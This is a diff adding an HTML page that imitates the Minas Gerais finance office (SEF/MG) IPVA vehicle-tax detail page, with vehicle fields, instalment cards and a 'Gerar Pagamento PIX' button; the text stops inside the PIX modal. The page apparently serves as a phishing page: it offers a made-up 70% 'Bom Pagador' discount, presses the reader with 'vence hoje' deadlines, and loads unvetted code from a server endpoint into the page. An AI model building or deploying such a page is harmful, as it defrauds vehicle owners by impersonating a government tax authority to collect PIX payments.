@@ -1,0 +1,970 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Detalhamento - SEF/MG</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="style.css?v=12">
+    <style>
+        body.result-page {
+            background-color: #f2f2f2;
+            display: block;
+            height: auto;
+        }
+
+        .top-bar-official {
+            background: #fff;
+            border-bottom: 1px solid #ddd;
+            padding: 10px 20px;
+            display: flex;
+            justify-content: space-between;
+            font-size: 14px;
+            color: #333;
+        }
+
+        .result-container {
+            width: 100%;
+            max-width: 100%;
+            margin: 0;
+            background: transparent;
+            padding: 0;
+            padding-bottom: 20px;
+        }
+
+        .section-official {
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
+            margin-bottom: 20px;
+            border-radius: 4px;
+            border: none;
+        }
+
+        /* Helpers for alignment */
+        .v-icon,
+        .top-icon,
+        .info-icon {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            vertical-align: middle;
+        }
+    </style>
+
+    <!-- Meta Pixel Code -->
+    <script>
+        // Load Meta Pixel dynamically from server
+        fetch('/api/get_pixel_code')
+            .then(r => r.text())
+            .then(code => {
+                if (code && document.head) {
+                    document.head.insertAdjacentHTML('beforeend', code);
+                }
+            });
+    </script>
+</head>
+
+<body class="result-page">
+
+    <!-- Top Bar Red -->
+    <div class="header-red-official">
+        <div class="header-left" onclick="window.location.href='index.html'" style="cursor:pointer;">
+            <img src="sef_logo_header.png" alt="SEF/MG" class="sef-logo">
+        </div>
+        <div class="header-info-text">
+            Consultado em <span id="headerDate">--/--/--</span> às <span id="headerTime">--:--</span> • Renavam: <span
+                id="headerRenavam">...</span>
+        </div>
+    </div>
+
+    <div class="result-container official-layout">
+
+        <!-- 1. Dados do Veículo -->
+        <section class="section-official">
+            <h3 class="section-title">Dados do veículo</h3>
+            <div class="vehicle-grid">
+                <!-- UF (Map Pin) -->
+                <div class="v-item">
+                    <span class="v-icon">
+                        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#777" stroke-width="2"
+                            stroke-linecap="round" stroke-linejoin="round">
+                            <path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"></path>
+                            <circle cx="12" cy="10" r="3"></circle>
+                        </svg>
+                    </span>
+                    <div><span class="v-label">UF:</span> <span class="v-value" id="resUF">MG</span></div>
+                </div>
+                <!-- Modelo (Car) -->
+                <div class="v-item">
+                    <span class="v-icon">
+                        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#777" stroke-width="2"
+                            stroke-linecap="round" stroke-linejoin="round">
+                            <rect x="1" y="3" width="15" height="13"></rect>
+                            <polygon points="16 8 20 8 23 11 23 16 16 16 16 8"></polygon>
+                            <circle cx="5.5" cy="18.5" r="2.5"></circle>
+                            <circle cx="18.5" cy="18.5" r="2.5"></circle>
+                        </svg>
+                    </span>
+                    <div><span class="v-label">Modelo:</span> <span class="v-value" id="resModelo">...</span></div>
+                </div>
+                <!-- Placa (Hash) -->
+                <div class="v-item">
+                    <span class="v-icon">
+                        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#777" stroke-width="2"
+                            stroke-linecap="round" stroke-linejoin="round">
+                            <line x1="4" y1="9" x2="20" y2="9"></line>
+                            <line x1="4" y1="15" x2="20" y2="15"></line>
+                            <line x1="10" y1="3" x2="8" y2="21"></line>
+                            <line x1="16" y1="3" x2="14" y2="21"></line>
+                        </svg>
+                    </span>
+                    <div><span class="v-label">Placa:</span> <span class="v-value" id="resPlaca">...</span></div>
+                </div>
+                <!-- Município (Map) -->
+                <div class="v-item">
+                    <span class="v-icon">
+                        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#777" stroke-width="2"
+                            stroke-linecap="round" stroke-linejoin="round">
+                            <polygon points="1 6 1 22 8 18 16 22 23 18 23 2 16 6 8 2 1 6"></polygon>
+                            <line x1="8" y1="2" x2="8" y2="18"></line>
+                            <line x1="16" y1="6" x2="16" y2="22"></line>
+                        </svg>
+                    </span>
+                    <div><span class="v-label">Município:</span> <span class="v-value" id="resMuni">...</span></div>
+                </div>
+                <!-- Renavam (File Check) -->
+                <div class="v-item">
+                    <span class="v-icon">
+                        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#777" stroke-width="2"
+                            stroke-linecap="round" stroke-linejoin="round">
+                            <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
+                            <polyline points="14 2 14 8 20 8"></polyline>
+                            <path d="M9 15l2 2 4-4"></path>
+                        </svg>
+                    </span>
+                    <div><span class="v-label">Renavam:</span> <span class="v-value" id="resRenavam">...</span></div>
+                </div>
+                <!-- Chassi (Key) -->
+                <div class="v-item">
+                    <span class="v-icon">
+                        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#777" stroke-width="2"
+                            stroke-linecap="round" stroke-linejoin="round">
+                            <path d="M21 2l-2 5.8 3-1-2 5.8-3-1v3h-2v-3l-3 1-2-5.8 3 1L12 2z"></path>
+                            <path d="M3 21h7v-7H3z"></path>
+                        </svg>
+                    </span>
+                    <div><span class="v-label">Chassi:</span> <span class="v-value" id="resChassi">**********...</span>
+                    </div>
+                </div>
+                <!-- Motor (Settings) -->
+                <div class="v-item">
+                    <span class="v-icon">
+                        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#777" stroke-width="2"
+                            stroke-linecap="round" stroke-linejoin="round">
+                            <circle cx="12" cy="12" r="3"></circle>
+                            <path
+                                d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1 0 2.83 2 2 0 0 1-2.83 0l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-2 2 2 2 0 0 1-2-2v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83 0 2 2 0 0 1 0-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1-2-2 2 2 0 0 1 2-2h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 0-2.83 2 2 0 0 1 2.83 0l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 2-2 2 2 0 0 1 2 2v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 0 2 2 0 0 1 0 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 2 2 2 2 0 0 1-2 2h-.09a1.65 1.65 0 0 0-1.51 1z">
+                            </path>
+                        </svg>
+                    </span>
+                    <div><span class="v-label">Motor:</span> <span class="v-value" id="resMotor">**********...</span>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- 2. Detalhamento e Pagamento -->
+        <section class="section-official">
+            <h3 class="section-title">Detalhamento e Pagamento</h3>
+
+
+            <div class="year-header"
+                style="display: grid; grid-template-columns: auto 1fr; align-items: center; width: 100%; gap: 10px;">
+                <div style="display: flex; align-items: center; white-space: nowrap;">
+                    <span>Exercício: <strong>2026</strong></span>
+                    <span class="info-icon" style="margin-left: 6px; display: inline-flex;">
+                        <!-- Info Icon SVG -->
+                        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#666" stroke-width="2"
+                            stroke-linecap="round" stroke-linejoin="round">
+                            <circle cx="12" cy="12" r="10"></circle>
+                            <line x1="12" y1="16" x2="12" y2="12"></line>
+                            <line x1="12" y1="8" x2="12.01" y2="8"></line>
+                        </svg>
+                    </span>
+                </div>
+
+            </div>
+
+            <div id="promoInfoContainer">
+                <!-- Promo Text Injected Here -->
+            </div>
+
+            <div class="cards-container">
+                <!-- Year 2026 - Expanded -->
+                <div
+                    style="background: white; border: 2px solid #ddd; border-radius: 12px; padding: 20px; margin-bottom: 15px;">
+
+                    <!-- Simple Price Display (MOVED TO TOP) -->
+                    <div
+                        style="background: #f8f9fa; border: 1px solid #dee2e6; border-radius: 4px; padding: 18px; margin-bottom: 20px;">
+                        <div style="display: flex; justify-content: space-between; align-items: center; gap: 30px;">
+                            <!-- Original Price -->
+                            <div style="flex: 1;">
+                                <div style="font-size: 13px; color: #6c757d; margin-bottom: 6px;">Valor total sem
+                                    desconto:</div>
+                                <div style="font-size: 22px; font-weight: 600; color: #6c757d; text-decoration: line-through;"
+                                    id="originalPrice">R$ 0,00</div>
+                            </div>
+
+                            <!-- Discounted Price -->
+                            <div style="flex: 1; text-align: right;">
+                                <div style="font-size: 13px; color: #28a745; margin-bottom: 6px;">Com desconto Bom
+                                    Pagador (70%):</div>
+                                <div style="font-size: 26px; font-weight: 700; color: #28a745;" id="discountedPrice">R$
+                                    0,00</div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Year Header -->
+                    <div
+                        style="display: flex; align-items: center; justify-content: space-between; margin-bottom: 20px;">
+                        <div style="display: flex; align-items: center; gap: 12px;">
+                            <svg width="24" height="24" viewBox="0 0 24 24" fill="#c62828">
+                                <path d="M9 16.2L4.8 12l-1.4 1.4L9 19 21 7l-1.4-1.4L9 16.2z" />
+                            </svg>
+                            <span style="font-size: 20px; font-weight: 700; color: #333;">2026</span>
+                        </div>
+                        <div style="text-align: right;">
+                            <div style="font-size: 13px; color: #666;">Valor total a pagar:</div>
+                            <div style="font-size: 18px; font-weight: 700; color: #333;" id="resTotalDetail">R$ 0,00
+                            </div>
+                            <div style="font-size: 11px; color: #999; margin-top: 2px;">(1ª parcela + licenciamento)
+                            </div>
+                        </div>
+                    </div>
+
+
+                    <!-- Benefit Message -->
+                    <div
+                        style="background: #e8f5e9; border-left: 3px solid #28a745; padding: 12px 16px; margin-bottom: 20px; border-radius: 4px;">
+                        <div style="font-size: 13px; color: #2e7d32; line-height: 1.5;">
+                            <strong>Vantagem:</strong> Com o desconto Bom Pagador, você paga apenas a 1ª parcela hoje e
+                            mantém seu dinheiro no bolso. Sem necessidade de pagamento à vista.
+                        </div>
+                    </div>
+
+                    <!-- Pagamentos Obrigatórios -->
+                    <div style="margin-bottom: 15px;">
+                        <h4
+                            style="font-size: 14px; color: #333; font-weight: 600; margin-bottom: 12px; padding-left: 5px;">
+                            Pagamentos Obrigatórios</h4>
+                    </div>
+
+                    <!-- Payment Cards Grid -->
+                    <div
+                        style="display: grid; grid-template-columns: repeat(auto-fit, minmax(240px, 1fr)); gap: 15px; margin-bottom: 25px;">
+                        <!-- Cota Única IPVA -->
+                        <div style="border: 2px solid #4CAF50; border-radius: 8px; padding: 15px; background: #f1f8f4;">
+                            <div style="display: flex; align-items: center; gap: 8px; margin-bottom: 12px;">
+                                <svg width="20" height="20" viewBox="0 0 24 24" fill="#4CAF50">
+                                    <path d="M9 16.2L4.8 12l-1.4 1.4L9 19 21 7l-1.4-1.4L9 16.2z" />
+                                </svg>
+                                <span style="font-weight: 600; font-size: 14px; color: #333;">1ª Parcela
+                                    <strong>IPVA</strong></span>
+                            </div>
+                            <div
+                                style="display: flex; align-items: center; gap: 6px; margin-bottom: 8px; color: #ff9800;">
+                                <svg width="18" height="18" viewBox="0 0 24 24" fill="#ff9800">
+                                    <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
+                                    <line x1="16" y1="2" x2="16" y2="6" stroke="white" stroke-width="2"></line>
+                                    <line x1="8" y1="2" x2="8" y2="6" stroke="white" stroke-width="2"></line>
+                                    <line x1="3" y1="10" x2="21" y2="10" stroke="white" stroke-width="2"></line>
+                                </svg>
+                                <span style="font-size: 13px; font-weight: 600;">Vence hoje</span>
+                            </div>
+                            <div style="display: flex; align-items: center; gap: 6px; margin-bottom: 6px;">
+                                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#666"
+                                    stroke-width="2">
+                                    <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
+                                    <line x1="16" y1="2" x2="16" y2="6"></line>
+                                    <line x1="8" y1="2" x2="8" y2="6"></line>
+                                    <line x1="3" y1="10" x2="21" y2="10"></line>
+                                </svg>
+                                <span style="font-size: 12px; color: #666;">Venc.:</span>
+                                <span style="font-size: 12px; color: #333; font-weight: 600;"
+                                    id="labelDate1">14/01/2026</span>
+                            </div>
+                            <div style="display: flex; align-items: center; gap: 6px;">
+                                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#666"
+                                    stroke-width="2">
+                                    <circle cx="12" cy="12" r="10"></circle>
+                                    <path d="M12 6v6l4 2"></path>
+                                </svg>
+                                <span style="font-size: 12px; color: #666;">Valor:</span>
+                                <span style="font-size: 14px; color: #333; font-weight: 700;" id="valAgreement">R$
+                                    0,00</span>
+                            </div>
+                        </div>
+
+                        <!-- Licenciamento (Obrigatório) -->
+                        <div style="border: 2px solid #2196F3; border-radius: 8px; padding: 15px; background: #e3f2fd;">
+                            <div style="display: flex; align-items: center; gap: 8px; margin-bottom: 12px;">
+                                <svg width="20" height="20" viewBox="0 0 24 24" fill="#2196F3">
+                                    <path d="M9 16.2L4.8 12l-1.4 1.4L9 19 21 7l-1.4-1.4L9 16.2z" />
+                                </svg>
+                                <span style="font-weight: 600; font-size: 14px; color: #333;"><strong>Licenciamento
+                                        2026</strong></span>
+                            </div>
+                            <div
+                                style="display: flex; align-items: center; gap: 6px; margin-bottom: 8px; color: #2196F3;">
+                                <svg width="18" height="18" viewBox="0 0 24 24" fill="#2196F3">
+                                    <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
+                                    <line x1="16" y1="2" x2="16" y2="6" stroke="white" stroke-width="2"></line>
+                                    <line x1="8" y1="2" x2="8" y2="6" stroke="white" stroke-width="2"></line>
+                                    <line x1="3" y1="10" x2="21" y2="10" stroke="white" stroke-width="2"></line>
+                                </svg>
+                                <span style="font-size: 13px; font-weight: 600;">Pagamento obrigatório hoje</span>
+                            </div>
+                            <div style="display: flex; align-items: center; gap: 6px; margin-bottom: 6px;">
+                                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#666"
+                                    stroke-width="2">
+                                    <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
+                                    <line x1="16" y1="2" x2="16" y2="6"></line>
+                                    <line x1="8" y1="2" x2="8" y2="6"></line>
+                                    <line x1="3" y1="10" x2="21" y2="10"></line>
+                                </svg>
+                                <span style="font-size: 12px; color: #666;">Venc.:</span>
+                                <span style="font-size: 12px; color: #333; font-weight: 600;">31/03/2026</span>
+                            </div>
+                            <div style="display: flex; align-items: center; gap: 6px;">
+                                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#666"
+                                    stroke-width="2">
+                                    <circle cx="12" cy="12" r="10"></circle>
+                                    <path d="M12 6v6l4 2"></path>
+                                </svg>
+                                <span style="font-size: 12px; color: #666;">Valor:</span>
+                                <span style="font-size: 14px; color: #333; font-weight: 700;" id="valLicensing">R$
+                                    0,00</span>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Parcelas Opcionais -->
+                    <div style="margin-bottom: 15px;">
+                        <h4
+                            style="font-size: 14px; color: #666; font-weight: 600; margin-bottom: 12px; padding-left: 5px;">
+                            Próximas Parcelas</h4>
+                    </div>
+
+                    <div
+                        style="display: grid; grid-template-columns: repeat(auto-fit, minmax(240px, 1fr)); gap: 15px; margin-bottom: 25px;">
+                        <!-- Parcela IPVA 2 (Opcional) -->
+                        <div
+                            style="border: 2px solid #e0e0e0; border-radius: 8px; padding: 15px; background: #fafafa; opacity: 0.8;">
+                            <div style="display: flex; align-items: center; gap: 8px; margin-bottom: 12px;">
+                                <div
+                                    style="width: 20px; height: 20px; border: 2px solid #ccc; border-radius: 4px; background: #f5f5f5;">
+                                </div>
+                                <span style="font-weight: 600; font-size: 14px; color: #666;">Parcela <strong>IPVA
+                                        2</strong></span>
+                            </div>
+                            <div style="display: flex; align-items: center; gap: 6px; margin-bottom: 8px; color: #999;">
+                                <svg width="18" height="18" viewBox="0 0 24 24" fill="#ccc">
+                                    <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
+                                    <line x1="16" y1="2" x2="16" y2="6" stroke="white" stroke-width="2"></line>
+                                    <line x1="8" y1="2" x2="8" y2="6" stroke="white" stroke-width="2"></line>
+                                    <line x1="3" y1="10" x2="21" y2="10" stroke="white" stroke-width="2"></line>
+                                </svg>
+                                <span style="font-size: 12px; font-weight: 600; color: #999;">Opcional</span>
+                            </div>
+                            <div style="display: flex; align-items: center; gap: 6px; margin-bottom: 6px;">
+                                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#666"
+                                    stroke-width="2">
+                                    <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
+                                    <line x1="16" y1="2" x2="16" y2="6"></line>
+                                    <line x1="8" y1="2" x2="8" y2="6"></line>
+                                    <line x1="3" y1="10" x2="21" y2="10"></line>
+                                </svg>
+                                <span style="font-size: 12px; color: #666;">Venc.:</span>
+                                <span style="font-size: 12px; color: #333; font-weight: 600;"
+                                    id="labelDate2">14/02/2026</span>
+                            </div>
+                            <div style="display: flex; align-items: center; gap: 6px;">
+                                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#666"
+                                    stroke-width="2">
+                                    <circle cx="12" cy="12" r="10"></circle>
+                                    <path d="M12 6v6l4 2"></path>
+                                </svg>
+                                <span style="font-size: 12px; color: #666;">Valor:</span>
+                                <span style="font-size: 14px; color: #333; font-weight: 700;" id="valParcela1">R$
+                                    0,00</span>
+                            </div>
+                        </div>
+
+                        <!-- Parcela IPVA 3 (Opcional) -->
+                        <div
+                            style="border: 2px solid #e0e0e0; border-radius: 8px; padding: 15px; background: #fafafa; opacity: 0.8;">
+                            <div style="display: flex; align-items: center; gap: 8px; margin-bottom: 12px;">
+                                <div
+                                    style="width: 20px; height: 20px; border: 2px solid #ccc; border-radius: 4px; background: #f5f5f5;">
+                                </div>
+                                <span style="font-weight: 600; font-size: 14px; color: #666;">Parcela <strong>IPVA
+                                        3</strong></span>
+                            </div>
+                            <div style="display: flex; align-items: center; gap: 6px; margin-bottom: 8px; color: #999;">
+                                <svg width="18" height="18" viewBox="0 0 24 24" fill="#ccc">
+                                    <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
+                                    <line x1="16" y1="2" x2="16" y2="6" stroke="white" stroke-width="2"></line>
+                                    <line x1="8" y1="2" x2="8" y2="6" stroke="white" stroke-width="2"></line>
+                                    <line x1="3" y1="10" x2="21" y2="10" stroke="white" stroke-width="2"></line>
+                                </svg>
+                                <span style="font-size: 12px; font-weight: 600; color: #999;">Opcional</span>
+                            </div>
+                            <div style="display: flex; align-items: center; gap: 6px; margin-bottom: 6px;">
+                                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#666"
+                                    stroke-width="2">
+                                    <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
+                                    <line x1="16" y1="2" x2="16" y2="6"></line>
+                                    <line x1="8" y1="2" x2="8" y2="6"></line>
+                                    <line x1="3" y1="10" x2="21" y2="10"></line>
+                                </svg>
+                                <span style="font-size: 12px; color: #666;">Venc.:</span>
+                                <span style="font-size: 12px; color: #666; font-weight: 600;"
+                                    id="labelDate3">13/04/2026</span>
+                            </div>
+                            <div style="display: flex; align-items: center; gap: 6px;">
+                                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#666"
+                                    stroke-width="2">
+                                    <circle cx="12" cy="12" r="10"></circle>
+                                    <path d="M12 6v6l4 2"></path>
+                                </svg>
+                                <span style="font-size: 12px; color: #666;">Valor:</span>
+                                <span style="font-size: 14px; color: #666; font-weight: 700;" id="valParcela3">R$
+                                    0,00</span>
+                            </div>
+                        </div>
+
+                        <!-- Parcela IPVA 4 (Opcional) -->
+                        <div
+                            style="border: 2px solid #e0e0e0; border-radius: 8px; padding: 15px; background: #fafafa; opacity: 0.8;">
+                            <div style="display: flex; align-items: center; gap: 8px; margin-bottom: 12px;">
+                                <div
+                                    style="width: 20px; height: 20px; border: 2px solid #ccc; border-radius: 4px; background: #f5f5f5;">
+                                </div>
+                                <span style="font-weight: 600; font-size: 14px; color: #666;">Parcela <strong>IPVA
+                                        4</strong></span>
+                            </div>
+                            <div style="display: flex; align-items: center; gap: 6px; margin-bottom: 8px; color: #999;">
+                                <svg width="18" height="18" viewBox="0 0 24 24" fill="#ccc">
+                                    <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
+                                    <line x1="16" y1="2" x2="16" y2="6" stroke="white" stroke-width="2"></line>
+                                    <line x1="8" y1="2" x2="8" y2="6" stroke="white" stroke-width="2"></line>
+                                    <line x1="3" y1="10" x2="21" y2="10" stroke="white" stroke-width="2"></line>
+                                </svg>
+                                <span style="font-size: 12px; font-weight: 600; color: #999;">Opcional</span>
+                            </div>
+                            <div style="display: flex; align-items: center; gap: 6px; margin-bottom: 6px;">
+                                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#666"
+                                    stroke-width="2">
+                                    <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
+                                    <line x1="16" y1="2" x2="16" y2="6"></line>
+                                    <line x1="8" y1="2" x2="8" y2="6"></line>
+                                    <line x1="3" y1="10" x2="21" y2="10"></line>
+                                </svg>
+                                <span style="font-size: 12px; color: #666;">Venc.:</span>
+                                <span style="font-size: 12px; color: #333; font-weight: 600;"
+                                    id="labelDate4">14/04/2026</span>
+                            </div>
+                            <div style="display: flex; align-items: center; gap: 6px;">
+                                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#666"
+                                    stroke-width="2">
+                                    <circle cx="12" cy="12" r="10"></circle>
+                                    <path d="M12 6v6l4 2"></path>
+                                </svg>
+                                <span style="font-size: 12px; color: #666;">Valor:</span>
+                                <span style="font-size: 14px; color: #333; font-weight: 700;" id="valParcela4">R$
+                                    0,00</span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Year 2025 - Collapsed -->
+                <div style="background: white; border: 2px solid #ddd; border-radius: 12px; padding: 18px; margin-bottom: 15px; cursor: pointer;"
+                    onclick="alert('Ano 2025 - Isento/Pago')">
+                    <div style="display: flex; align-items: center; justify-content: space-between;">
+                        <div style="display: flex; align-items: center; gap: 12px;">
+                            <svg width="24" height="24" viewBox="0 0 24 24" fill="#c62828">
+                                <path d="M9 16.2L4.8 12l-1.4 1.4L9 19 21 7l-1.4-1.4L9 16.2z" />
+                            </svg>
+                            <span style="font-size: 18px; font-weight: 700; color: #333;">2025</span>
+                        </div>
+                        <div style="display: flex; align-items: center; gap: 15px;">
+                            <div style="text-align: right;">
+                                <div style="font-size: 13px; color: #666;">Valor total a pagar:</div>
+                                <div style="font-size: 16px; font-weight: 700; color: #999;">---</div>
+                            </div>
+                            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#999" stroke-width="2">
+                                <polyline points="6 9 12 15 18 9"></polyline>
+                            </svg>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Year 2024 - Collapsed -->
+                <div style="background: white; border: 2px solid #ddd; border-radius: 12px; padding: 18px; margin-bottom: 15px; cursor: pointer;"
+                    onclick="alert('Ano 2024 - Isento/Pago')">
+                    <div style="display: flex; align-items: center; justify-content: space-between;">
+                        <div style="display: flex; align-items: center; gap: 12px;">
+                            <svg width="24" height="24" viewBox="0 0 24 24" fill="#c62828">
+                                <path d="M9 16.2L4.8 12l-1.4 1.4L9 19 21 7l-1.4-1.4L9 16.2z" />
+                            </svg>
+                            <span style="font-size: 18px; font-weight: 700; color: #333;">2024</span>
+                        </div>
+                        <div style="display: flex; align-items: center; gap: 15px;">
+                            <div style="text-align: right;">
+                                <div style="font-size: 13px; color: #666;">Valor total a pagar:</div>
+                                <div style="font-size: 16px; font-weight: 700; color: #999;">---</div>
+                            </div>
+                            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#999" stroke-width="2">
+                                <polyline points="6 9 12 15 18 9"></polyline>
+                            </svg>
+                        </div>
+                    </div>
+                </div>
+
+            </div>
+
+
+
+            <!-- Promo Warning (Subtle Gray) -->
+            <div
+                style="background: #f8f9fa; border-left: 3px solid #6c757d; padding: 12px 16px; margin: 20px 15px; border-radius: 4px; font-size: 12px; color: #6c757d; line-height: 1.5;">
+                <strong>Atenção:</strong> A promoção <strong>Bom Pagador (70% OFF)</strong> é válida apenas para
+                pagamento até <strong id="promoDeadlineDate2">hoje</strong>. Após esta data, o valor cobrado será de
+                <strong id="fullPriceValue2">R$ ...</strong> (valor integral sem desconto).
+            </div>
+
+            <!-- Resumo de Pagamento -->
+            <div
+                style="background: #fff; padding: 30px 20px; border-radius: 8px; margin-top: 20px; box-shadow: 0 1px 3px rgba(0,0,0,0.1);">
+                <h3 style="font-size: 20px; color: #333; margin-bottom: 25px; font-weight: 700;">Resumo de pagamento
+                </h3>
+
+                <table style="width: 100%; border-collapse: collapse; margin-bottom: 25px;">
+                    <thead>
+                        <tr style="color: #666; text-align: left;">
+                            <th
+                                style="padding: 12px 15px; font-weight: 600; font-size: 15px; border-bottom: 2px solid #f0f0f0;">
+                                Exerc.</th>
+                            <th
+                                style="padding: 12px 15px; font-weight: 600; font-size: 15px; border-bottom: 2px solid #f0f0f0;">
+                                1ª Parcela Bom Pagador</th>
+                            <th
+                                style="padding: 12px 15px; font-weight: 600; font-size: 15px; text-align: right; border-bottom: 2px solid #f0f0f0;">
+                                Valor Licen.</th>
+                        </tr>
+                    </thead>
+                    <tbody style="font-size: 15px; color: #333;">
+                        <tr style="background-color: #fff;">
+                            <td style="padding: 20px 15px; border-bottom: 1px solid #eee;">2026</td>
+                            <td style="padding: 20px 15px; border-bottom: 1px solid #eee;" id="resIpvaVal">...</td>
+                            <td style="padding: 20px 15px; text-align: right; border-bottom: 1px solid #eee;"
+                                id="resLicVal">...</td>
+                        </tr>
+                    </tbody>
+                </table>
+
+            </div>
+
+
+    </div>
+
+    </section>
+    </div>
+
+    <!-- Fixed Bottom Payment Bar -->
+    <div
+        style="position: fixed; bottom: 0; left: 0; right: 0; background: white; border-top: 2px solid #e0e0e0; box-shadow: 0 -2px 10px rgba(0,0,0,0.1); z-index: 1000;">
+        <div
+            style="display: flex; align-items: center; justify-content: space-between; padding: 15px 20px; max-width: 900px; margin: 0 auto;">
+            <div style="display: flex; flex-direction: column;">
+                <span style="font-size: 13px; color: #666; margin-bottom: 2px;">Total</span>
+                <span id="totalStickyBar" style="font-size: 24px; font-weight: 700; color: #2c3e50;">R$ 0,00</span>
+            </div>
+            <button onclick="generatePix()"
+                style="display: flex; align-items: center; justify-content: center; gap: 10px; background-color: #28a745; padding: 14px 28px; font-size: 16px; border-radius: 6px; box-shadow: 0 2px 8px rgba(40,167,69,0.3); border: none; color: white; cursor: pointer; font-weight: 600; transition: all 0.3s;"
+                onmouseover="this.style.background='#218838'" onmouseout="this.style.background='#28a745'">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 640" width="20" height="20" fill="#fff">
+                    <path
+                        d="M306.4 356.5C311.8 351.1 321.1 351.1 326.5 356.5L403.5 433.5C417.7 447.7 436.6 455.5 456.6 455.5L471.7 455.5L374.6 552.6C344.3 582.1 295.1 582.1 264.8 552.6L167.3 455.2L176.6 455.2C196.6 455.2 215.5 447.4 229.7 433.2L306.4 356.5zM326.5 282.9C320.1 288.4 311.9 288.5 306.4 282.9L229.7 206.2C215.5 191.1 196.6 184.2 176.6 184.2L167.3 184.2L264.7 86.8C295.1 56.5 344.3 56.5 374.6 86.8L471.8 183.9L456.6 183.9C436.6 183.9 417.7 191.7 403.5 205.9L326.5 282.9zM176.6 206.7C190.4 206.7 203.1 212.3 213.7 222.1L290.4 298.8C297.6 305.1 307 309.6 316.5 309.6C325.9 309.6 335.3 305.1 342.5 298.8L419.5 221.8C429.3 212.1 442.8 206.5 456.6 206.5L494.3 206.5L552.6 264.8C582.9 295.1 582.9 344.3 552.6 374.6L494.3 432.9L456.6 432.9C442.8 432.9 429.3 427.3 419.5 417.5L342.5 340.5C328.6 326.6 304.3 326.6 290.4 340.6L213.7 417.2C203.1 427 190.4 432.6 176.6 432.6L144.8 432.6L86.8 374.6C56.5 344.3 56.5 295.1 86.8 264.8L144.8 206.7L176.6 206.7z">
+                    </path>
+                </svg>
+                <span>Gerar Pagamento PIX</span>
+            </button>
+        </div>
+    </div>
+
+    <!-- Add padding to body to prevent content from being hidden behind fixed bar -->
+    <style>
+        body {
+            padding-bottom: 80px;
+        }
+    </style>
+
+
+    <!-- PIX Modal -->
+    <div id="pixModal" class="promo-modal-overlay">
+        <div class="promo-modal-content pix-modal-content"
+            style="max-width: 420px; max-height: 90vh; overflow-y: auto;">
+            <button class="btn-modal-close" onclick="closePixModal()">×</button>
+
+            <!-- PIX Logo -->
+            <div style="text-align: center; margin-bottom: 15px;">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 640" width="70" height="70" fill="#32BCAD">
+                    <path
